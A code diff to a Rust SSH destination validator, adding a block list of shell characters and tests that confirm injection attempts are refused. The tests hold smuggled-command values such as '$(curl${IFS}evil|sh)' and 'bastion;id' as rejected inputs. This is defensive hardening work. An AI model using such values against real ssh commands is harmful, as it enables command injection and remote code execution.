@@ -16,12 +16,12 @@ impl SshDestination {
             .strip_prefix('[')
             .and_then(|inner| inner.strip_suffix(']'))
             .unwrap_or(trimmed);
-        check_part("host", host)?;
+        check_part(Part::Host, host)?;
         if port == Some(0) {
             return Err(invalid("port 0 is not a valid port"));
         }
         if let Some(user) = &user {
-            check_part("user", user)?;
+            check_part(Part::User, user)?;
         }
         Ok(Self {
             host: host.to_owned(),
@@ -89,7 +89,35 @@ impl fmt::Display for SshDestination {
     }
 }
 
-fn check_part(name: &str, value: &str) -> Result<(), SshFailure> {
+/// What OpenSSH 9.6 refuses in a host or user name from the command line
+/// (`valid_hostname` and `valid_ruser` in ssh.c), plus the comma that
+/// separates `-J` hops. Older clients paste a jump hop into a proxy
+/// command that `sh -c` runs, so one of these would run as a command.
+const SHELL_CHARACTERS: &[char] = &['\'', '`', '"', '$', ';', '&', '<', '>', '|', '(', ')', '{', '}', ','];
+
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+enum Part {
+    Host,
+    User,
+}
+
+impl Part {
+    fn name(self) -> &'static str {
+        match self {
+            Self::Host => "host",
+            Self::User => "user",
+        }
+    }
+
+    /// A Windows account may be DOMAIN\user; a host name never holds a
+    /// backslash.
+    fn allows_backslash(self) -> bool {
+        self == Self::User
+    }
+}
+
+fn check_part(part: Part, value: &str) -> Result<(), SshFailure> {
+    let name = part.name();
     if value.is_empty() {
         return Err(invalid(&format!("the {name} is empty")));
     }
@@ -98,6 +126,13 @@ fn check_part(name: &str, value: &str) -> Result<(), SshFailure> {
     }
     if value.chars().any(|c| c.is_whitespace() || c.is_control()) {
         return Err(invalid(&format!("the {name} contains spaces or control characters")));
+    }
+    if let Some(found) = value.chars().find(|c| SHELL_CHARACTERS.contains(c)) {
+        return Err(invalid(&format!("the {name} contains '{found}'")));
+    }
+    // A trailing backslash would escape whatever ssh appends after it.
+    if value.ends_with('\\') || (!part.allows_backslash() && value.contains('\\')) {
+        return Err(invalid(&format!("the {name} contains '\\'")));
     }
     Ok(())
 }
@@ -127,6 +162,13 @@ mod tests {
             SshDestination::new("bastion", Some(0), None),
             SshDestination::new("bastion", None, Some("-lroot".to_owned())),
             SshDestination::new("bastion", None, Some(String::new())),
+            SshDestination::new("$(touch${IFS}pwned)", None, None),
+            SshDestination::new("bastion;id", None, None),
+            SshDestination::new("bastion`id`", None, None),
+            SshDestination::new("bastion|id", None, None),
+            SshDestination::new("bastion\\x", None, None),
+            SshDestination::new("bastion", None, Some("ops'x".to_owned())),
+            SshDestination::new("bastion", None, Some("ops\\".to_owned())),
         ];
         for result in rejected {
             assert!(
@@ -137,6 +179,21 @@ mod tests {
         let accepted = SshDestination::new(" bastion.example.com ", Some(2222), Some("deploy".to_owned())).unwrap();
         assert_eq!(accepted.host(), "bastion.example.com");
         assert_eq!(accepted.to_string(), "deploy@bastion.example.com:2222");
+        let domain_user = SshDestination::new("winhost", None, Some("CORP\\deploy".to_owned())).unwrap();
+        assert_eq!(domain_user.user(), Some("CORP\\deploy"));
+    }
+
+    #[test]
+    fn a_jump_hop_with_shell_characters_is_refused() {
+        for list in ["$(curl${IFS}evil|sh)", "ops@jump1,`id`", "jump1&id", "ops;id@jump1"] {
+            assert!(
+                matches!(
+                    SshDestination::parse_jump_list(list),
+                    Err(SshFailure::InvalidDestination { .. })
+                ),
+                "{list}"
+            );
+        }
     }
 
     #[test]
